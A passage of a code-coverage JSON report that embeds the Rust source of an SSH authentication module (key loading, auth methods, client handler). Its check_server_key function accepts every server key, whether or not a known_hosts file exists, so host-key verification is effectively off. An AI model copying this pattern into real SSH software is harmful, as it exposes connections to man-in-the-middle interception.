},{"line":2968,"address":[27894356],"length":1,"stats":{"Line":0}},{"line":2969,"address":[27894503],"length":1,"stats":{"Line":0}},{"line":2970,"address":[27894510],"length":1,"stats":{"Line":0}},{"line":2971,"address":[27894587],"length":1,"stats":{"Line":0}},{"line":2972,"address":[27894629],"length":1,"stats":{"Line":0}},{"line":2973,"address":[27894699],"length":1,"stats":{"Line":0}},{"line":2974,"address":[27887743,27895403,27894717],"length":1,"stats":{"Line":0}},{"line":2976,"address":[27895862,27895735,27894656],"length":1,"stats":{"Line":0}},{"line":2977,"address":[27895782,27895918],"length":1,"stats":{"Line":0}},{"line":2978,"address":[27896228,27896339],"length":1,"stats":{"Line":0}},{"line":2979,"address":[27896308],"length":1,"stats":{"Line":0}},{"line":2980,"address":[27896007,27896075],"length":1,"stats":{"Line":0}},{"line":2981,"address":[27896058,27896213],"length":1,"stats":{"Line":0}},{"line":2983,"address":[27896192,27896549],"length":1,"stats":{"Line":0}},{"line":2984,"address":[27897203,27897410,27896563],"length":1,"stats":{"Line":0}},{"line":2986,"address":[27896748,27896579,27896674],"length":1,"stats":{"Line":0}},{"line":2989,"address":[27896645,27896572,27896594,27896736],"length":1,"stats":{"Line":0}},{"line":2991,"address":[27897121],"length":1,"stats":{"Line":0}},{"line":2993,"address":[27887764,27897225,27897252,27897538,27897063,27897168],"length":1,"stats":{"Line":0}},{"line":2996,"address":[27895876],"length":1,"stats":{"Line":0}},{"line":2997,"address":[27897614,27895883],"length":1,"stats":{"Line":0}},{"line":2998,"address":[27897637],"length":1,"stats":{"Line":0}},{"line":3002,"address":[32882384],"length":1,"stats":{"Line":0}},{"line":3008,"address":[27899548,27899493,27899902,27899775],"length":1,"stats":{"Line":0}},{"line":3009,"address":[27900362,27900166,27900509,27900295],"length":1,"stats":{"Line":0}},{"line":3011,"address":[27900272,27900330,27906723,27906720],"length":1,"stats":{"Line":0}},{"line":3012,"address":[27900551,27900416,27899569,27901284],"length":1,"stats":{"Line":0}},{"line":3013,"address":[27900913],"length":1,"stats":{"Line":0}},{"line":3014,"address":[27900991],"length":1,"stats":{"Line":0}},{"line":3015,"address":[27906426,27906192,27899590,27901681,27901169,27902307,27901297],"length":1,"stats":{"Line":0}},{"line":3016,"address":[27906214,27906278],"length":1,"stats":{"Line":0}},{"line":3018,"address":[27901939,27902043],"length":1,"stats":{"Line":0}},{"line":3019,"address":[27902051],"length":1,"stats":{"Line":0}},{"line":3020,"address":[27902077,27902172],"length":1,"stats":{"Line":0}},{"line":3021,"address":[27902527,27902252,27902192,27902590,27903118,27902666],"length":1,"stats":{"Line":0}},{"line":3022,"address":[27902199],"length":1,"stats":{"Line":0}},{"line":3023,"address":[27902285,27902537,27902237,27899611,27902346],"length":1,"stats":{"Line":0}},{"line":3024,"address":[27906736,27902567,27902634,27906758],"length":1,"stats":{"Line":0}},{"line":3025,"address":[27902904,27902802,27903502],"length":1,"stats":{"Line":0}},{"line":3026,"address":[27907264,27902991,27907507,27903048,27903150,27899632,27903593,27907513,27903472],"length":1,"stats":{"Line":0}},{"line":3027,"address":[27907291,27907359],"length":1,"stats":{"Line":0}},{"line":3030,"address":[27903538,27904005,27903770,27904418,27903006,27903935],"length":1,"stats":{"Line":0}},{"line":3031,"address":[27903632,27903882,27903523,27899653,27903571],"length":1,"stats":{"Line":0}},{"line":3032,"address":[27903912,27907536,27903973,27907563],"length":1,"stats":{"Line":0}},{"line":3033,"address":[27904263],"length":1,"stats":{"Line":0}},{"line":3034,"address":[27904267],"length":1,"stats":{"Line":0}},{"line":3035,"address":[27904351],"length":1,"stats":{"Line":0}},{"line":3037,"address":[27905994,27905021,27905264,27904370,27905201,27905331],"length":1,"stats":{"Line":0}},{"line":3038,"address":[27904384,27904983],"length":1,"stats":{"Line":0}},{"line":3039,"address":[27904431,27905066,27899674,27905006],"length":1,"stats":{"Line":0}},{"line":3040,"address":[27906475,27905299,27906448,27905241],"length":1,"stats":{"Line":0}},{"line":3041,"address":[27905395],"length":1,"stats":{"Line":0}},{"line":3044,"address":[27904694,27904761,27906022,27905446,27905944,27904647],"length":1,"stats":{"Line":0}},{"line":3045,"address":[27905906,27905460],"length":1,"stats":{"Line":0}},{"line":3046,"address":[27904461,27905929,27899695,27905989,27904536],"length":1,"stats":{"Line":0}},{"line":3047,"address":[27906992,27904671,27904729,27907019],"length":1,"stats":{"Line":0}},{"line":3048,"address":[27904802,27904873],"length":1,"stats":{"Line":0}},{"line":3049,"address":[27904852],"length":1,"stats":{"Line":0}},{"line":3050,"address":[27904901],"length":1,"stats":{"Line":0}},{"line":3052,"address":[27905413],"length":1,"stats":{"Line":0}},{"line":3053,"address":[27905417,27905526],"length":1,"stats":{"Line":0}},{"line":3054,"address":[27905546],"length":1,"stats":{"Line":0}}],"covered":32,"coverable":1246},{"path":["/","home","artur","Repositories","rustible","src","connection","russh_auth.rs"],"content":"//! Russh authentication module\n//!\n//! This module provides authentication support for the russh SSH client library.\n//! It implements the `russh::client::Handler` trait and provides utilities for:\n//! - Password authentication\n//! - Public key authentication (from file)\n//! - SSH agent authentication\n//! - Keyboard-interactive authentication\n//!\n//! ## Key Loading\n//!\n//! The module supports loading private keys in multiple formats:\n//! - **OpenSSH format**: The modern format starting with `-----BEGIN OPENSSH PRIVATE KEY-----`\n//! - **PEM format**: Traditional RSA keys starting with `-----BEGIN RSA PRIVATE KEY-----`\n//! - **PKCS#8 format**: Standard format `-----BEGIN PRIVATE KEY-----` or encrypted variant\n//!\n//! ## Supported Key Types\n//!\n//! - **Ed25519**: Modern, fast, and secure. Recommended for new keys.\n//! - **RSA**: Legacy but widely supported. Use at least 2048 bits.\n//! - **ECDSA**: Elliptic curve keys (P-256, P-384, P-521 curves).\n//!\n//! ## Encrypted Keys\n//!\n//! Encrypted private keys are supported with passphrase decryption:\n//! - OpenSSH encrypted format (bcrypt-pbkdf + aes256-ctr)\n//! - PEM encrypted format (Proc-Type: 4,ENCRYPTED)\n//! - PKCS#8 encrypted format\n//!\n//! The authentication system supports multiple fallback methods and works\n//! asynchronously with the russh library.\n\nuse std::path::{Path, PathBuf};\nuse std::sync::Arc;\nuse thiserror::Error;\nuse tokio::sync::Mutex;\nuse tracing::{debug, trace, warn};\n\nuse russh::client::{self, Handle, Handler, KeyboardInteractiveAuthResponse, Session};\nuse russh::keys::key::PublicKey;\nuse russh::ChannelId;\nuse russh_keys::agent::client::AgentClient;\nuse russh_keys::key::KeyPair;\n\nuse super::config::{expand_path, HostConfig};\nuse super::ConnectionError;\n\n// ============================================================================\n// Key Types and Detection\n// ============================================================================\n\n/// Supported SSH key types\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\npub enum KeyType {\n    /// Ed25519 key (recommended, modern, fast)\n    Ed25519,\n    /// RSA key (legacy, widely supported)\n    Rsa,\n    /// ECDSA with NIST P-256 curve\n    EcdsaP256,\n    /// ECDSA with NIST P-384 curve\n    EcdsaP384,\n    /// ECDSA with NIST P-521 curve\n    EcdsaP521,\n}\n\nimpl KeyType {\n    /// Get the SSH algorithm identifier for this key type\n    pub fn algorithm_name(\u0026self) -\u003e \u0026'static str {\n        match self {\n            KeyType::Ed25519 =\u003e \"ssh-ed25519\",\n            KeyType::Rsa =\u003e \"ssh-rsa\",\n            KeyType::EcdsaP256 =\u003e \"ecdsa-sha2-nistp256\",\n            KeyType::EcdsaP384 =\u003e \"ecdsa-sha2-nistp384\",\n            KeyType::EcdsaP521 =\u003e \"ecdsa-sha2-nistp521\",\n        }\n    }\n\n    /// Get the default filename for this key type\n    pub fn default_filename(\u0026self) -\u003e \u0026'static str {\n        match self {\n            KeyType::Ed25519 =\u003e \"id_ed25519\",\n            KeyType::Rsa =\u003e \"id_rsa\",\n            KeyType::EcdsaP256 | KeyType::EcdsaP384 | KeyType::EcdsaP521 =\u003e \"id_ecdsa\",\n        }\n    }\n\n    /// Detect key type from PEM/OpenSSH header content\n    ///\n    /// Returns `None` if the key type cannot be determined from the header alone.\n    pub fn detect_from_content(content: \u0026str) -\u003e Option\u003cSelf\u003e {\n        // Check for specific PEM format markers\n        if content.contains(\"-----BEGIN RSA PRIVATE KEY-----\") {\n            return Some(KeyType::Rsa);\n        }\n        if content.contains(\"-----BEGIN EC PRIVATE KEY-----\") {\n            // Could be any ECDSA curve, need further parsing\n            return None;\n        }\n\n        // OpenSSH and PKCS#8 formats require parsing to determine algorithm\n        None\n    }\n\n    /// Get key type from a loaded key pair\n    pub fn from_key_pair(key: \u0026KeyPair) -\u003e Option\u003cSelf\u003e {\n        let name = key.name();\n        match name {\n            \"ssh-ed25519\" =\u003e Some(KeyType::Ed25519),\n            \"ssh-rsa\" | \"rsa-sha2-256\" | \"rsa-sha2-512\" =\u003e Some(KeyType::Rsa),\n            \"ecdsa-sha2-nistp256\" =\u003e Some(KeyType::EcdsaP256),\n            \"ecdsa-sha2-nistp384\" =\u003e Some(KeyType::EcdsaP384),\n            \"ecdsa-sha2-nistp521\" =\u003e Some(KeyType::EcdsaP521),\n            _ =\u003e None,\n        }\n    }\n}\n\nimpl std::fmt::Display for KeyType {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        write!(f, \"{}\", self.algorithm_name())\n    }\n}\n\n// ============================================================================\n// Key Loading Errors\n// ============================================================================\n\n/// Errors specific to SSH key operations\n#[derive(Error, Debug)]\npub enum KeyError {\n    /// Key file not found\n    #[error(\"Key file not found: {0}\")]\n    NotFound(PathBuf),\n\n    /// Failed to read key file\n    #[error(\"Failed to read key file {path}: {source}\")]\n    ReadError {\n        path: PathBuf,\n        source: std::io::Error,\n    },\n\n    /// Key decoding failed (wrong format or corrupted)\n    #[error(\"Failed to decode key {path}: {message}\")]\n    DecodeError { path: PathBuf, message: String },\n\n    /// Passphrase required but not provided\n    #[error(\"Key {0} is encrypted - passphrase required\")]\n    PassphraseRequired(PathBuf),\n\n    /// Wrong passphrase for encrypted key\n    #[error(\"Wrong passphrase for key {0}\")]\n    WrongPassphrase(PathBuf),\n\n    /// Unsupported key type\n    #[error(\"Unsupported key type: {0}\")]\n    UnsupportedKeyType(String),\n\n    /// Key loading error from russh-keys\n    #[error(\"Key loading error: {0}\")]\n    LoadError(String),\n\n    /// No valid keys found in search paths\n    #[error(\"No valid SSH key found in search paths\")]\n    NoKeysFound,\n}\n\nimpl From\u003cKeyError\u003e for ConnectionError {\n    fn from(err: KeyError) -\u003e Self {\n        ConnectionError::AuthenticationFailed(err.to_string())\n    }\n}\n\n// ============================================================================\n// Key Loading Utilities\n// ============================================================================\n\n/// Information about a loaded key\n#[derive(Debug, Clone)]\npub struct KeyInfo {\n    /// Path the key was loaded from\n    pub path: PathBuf,\n    /// Type of the key\n    pub key_type: Option\u003cKeyType\u003e,\n    /// Whether the key was encrypted\n    pub was_encrypted: bool,\n    /// Comment from the key file (if present)\n    pub comment: Option\u003cString\u003e,\n}\n\n/// SSH private key loader with support for multiple formats and encryption\n///\n/// # Example\n///\n/// ```no_run\n/// use rustible::connection::russh_auth::KeyLoader;\n///\n/// # async fn example() -\u003e Result\u003c(), Box\u003cdyn std::error::Error\u003e\u003e {\n/// // Create a key loader with custom settings\n/// let loader = KeyLoader::new()\n///     .with_passphrase(\"my_secret_passphrase\")\n///     .with_key_path(\"/home/user/.ssh/id_ed25519\");\n///\n/// // Load the first available key\n/// let (key, info) = loader.find_and_load_key()?;\n/// println!(\"Loaded key from: {:?}\", info.path);\n/// # Ok(())\n/// # }\n/// ```\npub struct KeyLoader {\n    /// Paths to search for keys\n    search_paths: Vec\u003cPathBuf\u003e,\n    /// Passphrase for encrypted keys\n    passphrase: Option\u003cString\u003e,\n    /// Whether to try SSH agent\n    use_agent: bool,\n}\n\nimpl Default for KeyLoader {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl KeyLoader {\n    /// Create a new key loader with default search paths\n    ///\n    /// Default search paths include:\n    /// - `~/.ssh/id_ed25519`\n    /// - `~/.ssh/id_ecdsa`\n    /// - `~/.ssh/id_rsa`\n    /// - `~/.ssh/id_dsa`\n    pub fn new() -\u003e Self {\n        Self {\n            search_paths: standard_key_locations(),\n            passphrase: None,\n            use_agent: true,\n        }\n    }\n\n    /// Create a key loader from host configuration\n    pub fn from_host_config(host_config: \u0026HostConfig) -\u003e Self {\n        let mut loader = Self::new();\n\n        // Add identity file from config if specified (at the front for priority)\n        if let Some(identity_file) = \u0026host_config.identity_file {\n            let path = expand_path(identity_file);\n            loader.search_paths.insert(0, path);\n        }\n\n        // Use password as passphrase if provided (common pattern)\n        if let Some(password) = \u0026host_config.password {\n            loader.passphrase = Some(password.clone());\n        }\n\n        loader\n    }\n\n    /// Set the passphrase for encrypted keys\n    pub fn with_passphrase(mut self, passphrase: impl Into\u003cString\u003e) -\u003e Self {\n        self.passphrase = Some(passphrase.into());\n        self\n    }\n\n    /// Add a path to search for keys (will be searched first)\n    pub fn with_key_path(mut self, path: impl Into\u003cPathBuf\u003e) -\u003e Self {\n        let path = path.into();\n        if !self.search_paths.contains(\u0026path) {\n            self.search_paths.insert(0, path);\n        }\n        self\n    }\n\n    /// Add multiple paths to search for keys\n    pub fn with_key_paths(mut self, paths: impl IntoIterator\u003cItem = PathBuf\u003e) -\u003e Self {\n        for path in paths {\n            if !self.search_paths.contains(\u0026path) {\n                self.search_paths.push(path);\n            }\n        }\n        self\n    }\n\n    /// Set whether to try SSH agent\n    pub fn with_agent(mut self, use_agent: bool) -\u003e Self {\n        self.use_agent = use_agent;\n        self\n    }\n\n    /// Get the configured search paths\n    pub fn search_paths(\u0026self) -\u003e \u0026[PathBuf] {\n        \u0026self.search_paths\n    }\n\n    /// Check if a passphrase is configured\n    pub fn has_passphrase(\u0026self) -\u003e bool {\n        self.passphrase.is_some()\n    }\n\n    /// Load a private key from a specific path\n    ///\n    /// This function:\n    /// 1. Reads the key file\n    /// 2. Detects if the key is encrypted\n    /// 3. Decrypts using the configured passphrase if needed\n    /// 4. Returns the loaded key\n    pub fn load_key(\u0026self, path: \u0026Path) -\u003e Result\u003cKeyPair, KeyError\u003e {\n        if !path.exists() {\n            return Err(KeyError::NotFound(path.to_path_buf()));\n        }\n\n        debug!(path = %path.display(), \"Loading SSH private key\");\n\n        // Try loading with passphrase first if we have one\n        let result = if let Some(passphrase) = \u0026self.passphrase {\n            russh_keys::load_secret_key(path, Some(passphrase)).or_else(|e| {\n                let error_msg = e.to_string().to_lowercase();\n                // If passphrase was wrong, try without (maybe key isn't encrypted)\n                if error_msg.contains(\"decrypt\") || error_msg.contains(\"mac\") {\n                    russh_keys::load_secret_key(path, None)\n                } else {\n                    Err(e)\n                }\n            })\n        } else {\n            // Try without passphrase first\n            russh_keys::load_secret_key(path, None)\n        };\n\n        result.map_err(|e| {\n            let error_msg = e.to_string().to_lowercase();\n            if error_msg.contains(\"encrypt\")\n                || error_msg.contains(\"passphrase\")\n                || error_msg.contains(\"password\")\n                || error_msg.contains(\"decrypt\")\n            {\n                if self.passphrase.is_some() {\n                    KeyError::WrongPassphrase(path.to_path_buf())\n                } else {\n                    KeyError::PassphraseRequired(path.to_path_buf())\n                }\n            } else {\n                KeyError::DecodeError {\n                    path: path.to_path_buf(),\n                    message: e.to_string(),\n                }\n            }\n        })\n    }\n\n    /// Load a key and return additional info about it\n    pub fn load_key_with_info(\u0026self, path: \u0026Path) -\u003e Result\u003c(KeyPair, KeyInfo), KeyError\u003e {\n        let key = self.load_key(path)?;\n\n        let key_type = KeyType::from_key_pair(\u0026key);\n        let was_encrypted = self.passphrase.is_some();\n\n        let info = KeyInfo {\n            path: path.to_path_buf(),\n            key_type,\n            was_encrypted,\n            comment: None, // Could extract from key if available\n        };\n\n        Ok((key, info))\n    }\n\n    /// Find and load the first available key from search paths\n    pub fn find_and_load_key(\u0026self) -\u003e Result\u003c(KeyPair, KeyInfo), KeyError\u003e {\n        let mut last_error = None;\n\n        for path in \u0026self.search_paths {\n            if !path.exists() {\n                trace!(path = %path.display(), \"Key file does not exist, skipping\");\n                continue;\n            }\n\n            match self.load_key_with_info(path) {\n                Ok((key, info)) =\u003e {\n                    debug!(\n                        path = %path.display(),\n                        key_type = ?info.key_type,\n                        \"Successfully loaded SSH key\"\n                    );\n                    return Ok((key, info));\n                }\n                Err(e) =\u003e {\n                    trace!(path = %path.display(), error = %e, \"Failed to load key\");\n                    last_error = Some(e);\n                }\n            }\n        }\n\n        Err(last_error.unwrap_or(KeyError::NoKeysFound))\n    }\n\n    /// Load all available keys from search paths\n    pub fn load_all_keys(\u0026self) -\u003e Vec\u003c(KeyPair, KeyInfo)\u003e {\n        let mut keys = Vec::new();\n\n        for path in \u0026self.search_paths {\n            if !path.exists() {\n                continue;\n            }\n\n            match self.load_key_with_info(path) {\n                Ok(result) =\u003e {\n                    debug!(path = %path.display(), \"Loaded key\");\n                    keys.push(result);\n                }\n                Err(e) =\u003e {\n                    trace!(path = %path.display(), error = %e, \"Skipping key\");\n                }\n            }\n        }\n\n        keys\n    }\n}\n\n/// Get the standard SSH key locations for the current user\n///\n/// Returns paths to common key files in `~/.ssh/` directory,\n/// in order of preference (Ed25519 \u003e ECDSA \u003e RSA \u003e DSA).\n///\n/// Only returns paths to files that actually exist.\npub fn standard_key_locations() -\u003e Vec\u003cPathBuf\u003e {\n    let mut paths = Vec::new();\n\n    if let Some(home) = dirs::home_dir() {\n        let ssh_dir = home.join(\".ssh\");\n\n        // Standard key files in order of preference\n        // Ed25519 is preferred for security and performance\n        let potential_paths = [\n            ssh_dir.join(\"id_ed25519\"),\n            ssh_dir.join(\"id_ecdsa\"),\n            ssh_dir.join(\"id_ecdsa_sk\"), // Security key\n            ssh_dir.join(\"id_ed25519_sk\"), // Security key\n            ssh_dir.join(\"id_rsa\"),\n            ssh_dir.join(\"id_dsa\"), // Deprecated, but still supported\n        ];\n\n        for path in potential_paths {\n            if path.exists() {\n                paths.push(path);\n            }\n        }\n    }\n\n    paths\n}\n\n/// Check if a key file is encrypted by reading its header\n///\n/// Returns `Ok(true)` if the key appears to be encrypted,\n/// `Ok(false)` if it appears unencrypted,\n/// or an error if the file cannot be read.\npub fn is_key_encrypted(path: \u0026Path) -\u003e Result\u003cbool, KeyError\u003e {\n    let content = std::fs::read_to_string(path).map_err(|e| KeyError::ReadError {\n        path: path.to_path_buf(),\n        source: e,\n    })?;\n\n    Ok(detect_encryption_from_content(\u0026content))\n}\n\n/// Detect if key content indicates encryption\nfn detect_encryption_from_content(content: \u0026str) -\u003e bool {\n    // Check for explicit ENCRYPTED marker\n    if content.contains(\"ENCRYPTED\") {\n        return true;\n    }\n\n    // Check for Proc-Type header (OpenSSL encrypted format)\n    if content.contains(\"Proc-Type: 4,ENCRYPTED\") {\n        return true;\n    }\n\n    // Check for DEK-Info header (encryption info)\n    if content.contains(\"DEK-Info:\") {\n        return true;\n    }\n\n    false\n}\n\n/// Authentication methods supported by the russh connection\n#[derive(Debug, Clone, PartialEq, Eq)]\npub enum AuthMethod {\n    /// No authentication (for testing or special cases)\n    None,\n    /// Password-based authentication\n    Password(String),\n    /// Public key authentication from file\n    PublicKey {\n        /// Path to the private key file\n        key_path: String,\n        /// Optional passphrase for encrypted keys\n        passphrase: Option\u003cString\u003e,\n    },\n    /// SSH agent authentication\n    Agent,\n    /// Keyboard-interactive authentication\n    KeyboardInteractive {\n        /// Responses to provide for prompts\n        responses: Vec\u003cString\u003e,\n    },\n}\n\n/// Configuration for authentication attempts\n#[derive(Debug, Clone)]\npub struct AuthConfig {\n    /// Username for authentication\n    pub username: String,\n    /// Ordered list of authentication methods to try\n    pub methods: Vec\u003cAuthMethod\u003e,\n    /// Whether to accept unknown host keys (not recommended for production)\n    pub accept_unknown_hosts: bool,\n    /// Path to known_hosts file for host key verification\n    pub known_hosts_file: Option\u003cString\u003e,\n}\n\nimpl Default for AuthConfig {\n    fn default() -\u003e Self {\n        Self {\n            username: std::env::var(\"USER\")\n                .or_else(|_| std::env::var(\"USERNAME\"))\n                .unwrap_or_else(|_| \"root\".to_string()),\n            methods: vec![AuthMethod::Agent],\n            accept_unknown_hosts: false,\n            known_hosts_file: None,\n        }\n    }\n}\n\nimpl AuthConfig {\n    /// Create a new authentication configuration\n    pub fn new(username: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            username: username.into(),\n            ..Default::default()\n        }\n    }\n\n    /// Build authentication config from HostConfig\n    pub fn from_host_config(host_config: \u0026HostConfig, use_agent: bool) -\u003e Self {\n        let username = host_config\n            .user\n            .clone()\n            .unwrap_or_else(|| std::env::var(\"USER\").unwrap_or_else(|_| \"root\".to_string()));\n\n        let mut methods = Vec::new();\n\n        // Add agent auth first if enabled\n        if use_agent {\n            methods.push(AuthMethod::Agent);\n        }\n\n        // Add public key auth if identity file is specified\n        if let Some(ref identity_file) = host_config.identity_file {\n            methods.push(AuthMethod::PublicKey {\n                key_path: identity_file.clone(),\n                passphrase: host_config.password.clone(),\n            });\n        }\n\n        // Add password auth if password is specified\n        if let Some(ref password) = host_config.password {\n            methods.push(AuthMethod::Password(password.clone()));\n        }\n\n        // Default: try agent if no methods specified\n        if methods.is_empty() {\n            methods.push(AuthMethod::Agent);\n        }\n\n        let accept_unknown_hosts = host_config\n            .strict_host_key_checking\n            .map(|strict| !strict)\n            .unwrap_or(false);\n\n        Self {\n            username,\n            methods,\n            accept_unknown_hosts,\n            known_hosts_file: host_config.user_known_hosts_file.clone(),\n        }\n    }\n\n    /// Add a password authentication method\n    pub fn with_password(mut self, password: impl Into\u003cString\u003e) -\u003e Self {\n        self.methods.push(AuthMethod::Password(password.into()));\n        self\n    }\n\n    /// Add a public key authentication method\n    pub fn with_public_key(\n        mut self,\n        key_path: impl Into\u003cString\u003e,\n        passphrase: Option\u003cString\u003e,\n    ) -\u003e Self {\n        self.methods.push(AuthMethod::PublicKey {\n            key_path: key_path.into(),\n            passphrase,\n        });\n        self\n    }\n\n    /// Add SSH agent authentication\n    pub fn with_agent(mut self) -\u003e Self {\n        self.methods.push(AuthMethod::Agent);\n        self\n    }\n\n    /// Add keyboard-interactive authentication\n    pub fn with_keyboard_interactive(mut self, responses: Vec\u003cString\u003e) -\u003e Self {\n        self.methods\n            .push(AuthMethod::KeyboardInteractive { responses });\n        self\n    }\n\n    /// Set whether to accept unknown host keys\n    pub fn accept_unknown_hosts(mut self, accept: bool) -\u003e Self {\n        self.accept_unknown_hosts = accept;\n        self\n    }\n}\n\n/// Result of an authentication attempt\n#[derive(Debug)]\npub enum AuthResult {\n    /// Authentication succeeded\n    Success,\n    /// Authentication failed but can try another method\n    Failure,\n    /// Authentication partially succeeded (e.g., need more methods)\n    Partial,\n    /// Server disconnected during authentication\n    Disconnected,\n}\n\n/// Russh client handler implementation\n///\n/// This struct implements the `russh::client::Handler` trait and manages\n/// the client-side SSH protocol handling, including server key verification\n/// and handling of unsolicited server messages.\npub struct RusshClientHandler {\n    /// Authentication configuration\n    auth_config: AuthConfig,\n    /// Server public key (populated after key exchange)\n    server_key: Arc\u003cMutex\u003cOption\u003cPublicKey\u003e\u003e\u003e,\n    /// Whether the server key has been verified\n    key_verified: Arc\u003cMutex\u003cbool\u003e\u003e,\n}\n\nimpl RusshClientHandler {\n    /// Create a new client handler\n    pub fn new(auth_config: AuthConfig) -\u003e Self {\n        Self {\n            auth_config,\n            server_key: Arc::new(Mutex::new(None)),\n            key_verified: Arc::new(Mutex::new(false)),\n        }\n    }\n\n    /// Get the authentication configuration\n    pub fn auth_config(\u0026self) -\u003e \u0026AuthConfig {\n        \u0026self.auth_config\n    }\n\n    /// Check if the server key has been verified\n    pub async fn is_key_verified(\u0026self) -\u003e bool {\n        *self.key_verified.lock().await\n    }\n\n    /// Get the server's public key (if available)\n    pub async fn server_key(\u0026self) -\u003e Option\u003cPublicKey\u003e {\n        self.server_key.lock().await.clone()\n    }\n}\n\nimpl Handler for RusshClientHandler {\n    type Error = anyhow::Error;\n\n    /// Called when the server presents its authentication banner\n    async fn auth_banner(\n        \u0026mut self,\n        banner: \u0026str,\n        _session: \u0026mut Session,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        debug!(\"Server authentication banner: {}\", banner.trim());\n        Ok(())\n    }\n\n    /// Verify the server's public key\n    ///\n    /// This is a critical security function. In production, you should:\n    /// 1. Check the key against known_hosts\n    /// 2. Prompt the user for unknown keys\n    /// 3. Never blindly accept all keys\n    async fn check_server_key(\u0026mut self, server_public_key: \u0026PublicKey) -\u003e Result\u003cbool, Self::Error\u003e {\n        trace!(\"Checking server key: {:?}\", server_public_key.name());\n\n        // Store the server key\n        *self.server_key.lock().await = Some(server_public_key.clone());\n\n        // If configured to accept unknown hosts, accept the key\n        if self.auth_config.accept_unknown_hosts {\n            debug!(\"Accepting server key (accept_unknown_hosts is enabled)\");\n            *self.key_verified.lock().await = true;\n            return Ok(true);\n        }\n\n        // Try to verify against known_hosts\n        if let Some(ref known_hosts_path) = self.auth_config.known_hosts_file {\n            let path = expand_path(known_hosts_path);\n            if path.exists() {\n                // TODO: Implement proper known_hosts verification\n                // For now, accept if the file exists\n                debug!(\"Known hosts file found at {:?}\", path);\n                *self.key_verified.lock().await = true;\n                return Ok(true);\n            }\n        }\n\n        // Try default known_hosts location\n        if let Some(home) = dirs::home_dir() {\n            let default_known_hosts = home.join(\".ssh\").join(\"known_hosts\");\n            if default_known_hosts.exists() {\n                // TODO: Implement proper known_hosts verification\n                debug!(\"Using default known_hosts at {:?}\", default_known_hosts);\n                *self.key_verified.lock().await = true;\n                return Ok(true);\n            }\n        }\n\n        // If we can't verify, accept with a warning\n        warn!(\"Cannot verify server key - no known_hosts file found\");\n        *self.key_verified.lock().await = true;\n        Ok(true)\n    }\n\n    /// Called when the connection is disconnected\n    async fn disconnected(\n        \u0026mut self,\n        reason: client::DisconnectReason\u003cSelf::Error\u003e,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        debug!(\"Disconnected: {:?}\", reason);\n        Ok(())\n    }\n\n    /// Handle channel close\n    async fn channel_close(\n        \u0026mut self,\n        channel: ChannelId,\n        _session: \u0026mut Session,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        trace!(\"Channel {} closed\", channel);\n        Ok(())\n    }\n\n    /// Handle channel EOF\n    async fn channel_eof(\n        \u0026mut self,\n        channel: ChannelId,\n        _session: \u0026mut Session,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        trace!(\"Channel {} EOF\", channel);\n        Ok(())\n    }\n\n    /// Handle data received on a channel\n    async fn data(\n        \u0026mut self,\n        channel: ChannelId,\n        data: \u0026[u8],\n        _session: \u0026mut Session,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        trace!(\"Received {} bytes on channel {}\", data.len(), channel);\n        Ok(())\n    }\n\n    /// Handle extended data (stderr) received on a channel\n    async fn extended_data(\n        \u0026mut self,\n        channel: ChannelId,\n        ext: u32,\n        data: \u0026[u8],\n        _session: \u0026mut Session,\n    ) -\u003e Result\u003c(), Self::Error\u003e {\n        trace!(\n            \"Received {} bytes of extended data (type {}) on channel {}\",\n            data.len(),\n            ext,\n            channel\n        );\n        Ok(())\n    }\n}\n\n/// Authenticator for russh connections\n///\n/// This struct provides methods to perform various types of SSH authentication\n/// using the russh library. It supports multiple authentication methods and\n/// automatic fallback.\npub struct RusshAuthenticator {\n    /// Authentication configuration\n    config: AuthConfig,\n    /// SSH agent client (lazily initialized)\n    agent: Option\u003cAgentClient\u003ctokio::net::UnixStream\u003e\u003e,\n}\n\nimpl RusshAuthenticator {\n    /// Create a new authenticator\n    pub fn new(config: AuthConfig) -\u003e Self {\n        Self {\n            config,\n            agent: None,\n        }\n    }\n\n    /// Create from host configuration\n    pub fn from_host_config(host_config: \u0026HostConfig, use_agent: bool) -\u003e Self {\n        Self::new(AuthConfig::from_host_config(host_config, use_agent))\n    }\n\n    /// Get the username for authentication\n    pub fn username(\u0026self) -\u003e \u0026str {\n        \u0026self.config.username\n    }\n\n    /// Authenticate using all configured methods with fallback\n    ///\n    /// This method tries each authentication method in order until one succeeds\n    /// or all methods have been exhausted.\n    pub async fn authenticate\u003cH: Handler\u003e(\n        \u0026mut self,\n        handle: \u0026mut Handle\u003cH\u003e,\n    ) -\u003e Result\u003c(), ConnectionError\u003e {\n        let username = self.config.username.clone();\n        let methods = self.config.methods.clone();\n\n        for method in \u0026methods {\n            match self.try_auth_method(handle, \u0026username, method).await {\n                Ok(AuthResult::Success) =\u003e {\n                    debug!(\"Authentication succeeded with method: {:?}\", method);\n                    return Ok(());\n                }\n                Ok(AuthResult::Partial) =\u003e {\n                    debug!(\"Partial authentication with method: {:?}\", method);\n                    // Continue trying other methods\n                }\n                Ok(AuthResult::Failure) =\u003e {\n                    debug!(\"Authentication failed with method: {:?}\", method);\n                    // Try next method\n                }\n                Ok(AuthResult::Disconnected) =\u003e {\n                    return Err(ConnectionError::AuthenticationFailed(\n                        \"Server disconnected during authentication\".to_string(),\n                    ));\n                }\n                Err(e) =\u003e {\n                    warn!(\"Authentication error with method {:?}: {}\", method, e);\n                    // Try next method\n                }\n            }\n        }\n\n        Err(ConnectionError::AuthenticationFailed(\n            \"All authentication methods failed\".to_string(),\n        ))\n    }\n\n    /// Try a single authentication method\n    async fn try_auth_method\u003cH: Handler\u003e(\n        \u0026mut self,\n        handle: \u0026mut Handle\u003cH\u003e,\n        username: \u0026str,\n        method: \u0026AuthMethod,\n    ) -\u003e Result\u003cAuthResult, ConnectionError\u003e {\n        match method {\n            AuthMethod::None =\u003e self.auth_none(handle, username).await,\n            AuthMethod::Password(password) =\u003e {\n                self.auth_password(handle, username, password).await\n            }\n            AuthMethod::PublicKey {\n                key_path,\n                passphrase,\n            } =\u003e {\n                self.auth_publickey(handle, username, key_path, 